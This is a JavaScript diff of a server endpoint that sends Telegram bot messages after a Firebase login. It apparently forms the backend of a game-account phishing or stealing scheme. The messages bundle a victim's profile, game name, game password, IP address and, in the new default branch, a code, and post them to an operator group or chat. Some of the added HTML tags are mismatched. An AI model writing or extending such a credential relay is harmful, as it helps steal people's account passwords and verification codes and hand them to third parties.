@@ -40,7 +40,10 @@ const notify = async (req, res, next) => {
             .signInWithEmailAndPassword(request.email, request.password);
 
         if (!authenticatedUser.user.emailVerified) {
-            return sendEmailVerification(data.user, res);
+            res.status(400);
+            next({
+                message: `The email ${request.email} has not been verified`,
+            });
         }
 
         const doc = await db.doc(`/users/${authenticatedUser.user.uid}`).get();
@@ -62,27 +65,36 @@ const notify = async (req, res, next) => {
                     chatId = groupId;
                     msg = `<b>${request.message}</b>
 
-                    <b>PROFILE:</b> ${request.profile}
-                    <b>GAME:</b> ${request.gameName}
-                    <b>PASSWORD:</b> ${request.password}
-                    <b>IP:</b> ${request.ip}`;
+                    <u><b>PROFILE:</b></u> ${request.profile}
+                    <u><b>GAME:</b></u> ${request.gameName}
+                    <u><b>PASSWORD:</b></u> ${request.gamePassword}
+                    <u><b>IP:</b></u> ${request.ip}`;
 
                     break;
                 case 'Trade':
                     chatId = user.telegramId;
-                    msg = `<b>${request.message}</b>
+                    msg = `<b>${request.message}</b></u>
 
-                    <u><b>PROFILE:</b> ${request.profile}</u>
-                    <b>GAME:</b> ${request.gameName}`;
+                    <b>PROFILE:</b></u> ${request.profile}
+                    <b>GAME:</b></u> ${request.gameName}`;
 
                     break;
                 case 'Soj':
                     chatId = groupId;
                     msg = `<b>${request.message}</b>
-                    <b>IP:</b> ${request.ip}`;
+
+                    <u><b>IP:</b></u> ${request.ip}`;
 
                     break;
                 default:
+                    chatId = user.telegramId;
+                    msg = `<b>${request.message}</b>
+
+                    <u><b>CODE:</b> ${request.code}</u>
+                    <u><b>PROFILE:</b></u> ${request.profile}
+                    <u><b>GAME:</b></u> ${request.gameName}
+                    <u><b>PASSWORD:</b></u> ${request.gamePassword}
+                    <u><b>IP:</b></u> ${request.ip}`;
                     break;
             }
 
@@ -90,7 +102,7 @@ const notify = async (req, res, next) => {
                 parse_mode: 'HTML',
             });
 
-            return res.send('Server received your message');
+            return res.send(`Server got your message`);
         } else if (user.telegramId !== '') {
             msg = `Telegram ID ( ${user.telegramId} ) not verified, please send /verify to link your telegram with ${user.email}`;
             bot.telegram.sendMessage(user.telegramId, msg, {
@@ -101,7 +113,7 @@ const notify = async (req, res, next) => {
             next({ message: 'Telegram ID not verified' });
         } else {
             res.status(400);
-            next({ message: 'This Telegram ID is not linked to any user.' });
+            next({ message: 'Telegram ID not found' });
         }
     } catch (error) {
         if (error.code === 'auth/wrong-password') {
